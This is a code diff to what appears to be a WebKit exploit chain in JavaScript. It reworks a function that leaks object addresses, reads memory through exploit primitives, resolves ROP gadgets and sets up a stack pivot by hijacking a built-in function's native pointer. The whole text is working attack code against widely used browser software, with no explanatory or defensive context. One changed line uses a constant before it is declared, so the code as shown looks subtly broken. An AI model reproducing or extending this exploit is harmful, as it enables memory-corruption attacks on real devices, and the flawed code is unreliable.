@@ -8,8 +8,8 @@ import { PIVOT_ROWS, verifyPivotSet } from "./pivot_gadgets.js";
 export const SYS = { getpid: 20, getuid: 0x18 };
 
 const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
-const STACK_SIZE = 0x1000;
-const SLAB_SIZE = 0x1100;
+const STACK_SIZE = 0x800;
+const SLAB_SIZE = OFF_STACK + STACK_SIZE;
 const OFF_STORE = 0;
 const OFF_PIVOT = 0x40;
 const OFF_STACK = 0x100;
@@ -93,8 +93,8 @@ function buildSlabCtx(p, off, G) {
     return M;
 }
 
-/** One slab + pivot handles — call from Save bases while memory is fresh. */
-export function prepNativeChain(p, off, webkitBase) {
+/** One slab + pivot handles — call at PRIMITIVE-OK while memory is fresh. */
+export function prepNativeChain(p, off, webkitBase, cap) {
     if (!p || !off || !webkitBase)
         throw new Error("prepNativeChain: need p, off, webkitBase");
     const resolved = resolveGadgetsTrust(webkitBase, off);
@@ -102,12 +102,20 @@ export function prepNativeChain(p, off, webkitBase) {
         throw new Error("prepNativeChain: gadget-bad " + resolved.bad.join(","));
     const G = resolved.G;
     const M = buildSlabCtx(p, off, G);
-    const cell = p.leakval(Math.expm1);
-    const mainMf = p.read8(p.read8(cell.add32(0x18))
-        .add32(off.wk_JSFunction_m_function || 0x28));
-    const mainOrig = p.read8(mainMf);
-    const pivotObj = {};
-    const pivotCell = p.leakval(pivotObj);
+    let mainMf, mainOrig, pivotObj, pivotCell;
+    if (cap && cap.mainMf && cap.mainOrig != null && cap.pivotCell) {
+        mainMf = cap.mainMf;
+        mainOrig = cap.mainOrig;
+        pivotObj = cap.pivotObj;
+        pivotCell = cap.pivotCell;
+    } else {
+        const cell = p.leakval(Math.expm1);
+        const jfn = p.read8(cell.add32(0x18));
+        mainMf = jfn.add32(off.wk_JSFunction_m_function || 0x28);
+        mainOrig = p.read8(mainMf);
+        pivotObj = {};
+        pivotCell = p.leakval(pivotObj);
+    }
     return {
         M,
         G,
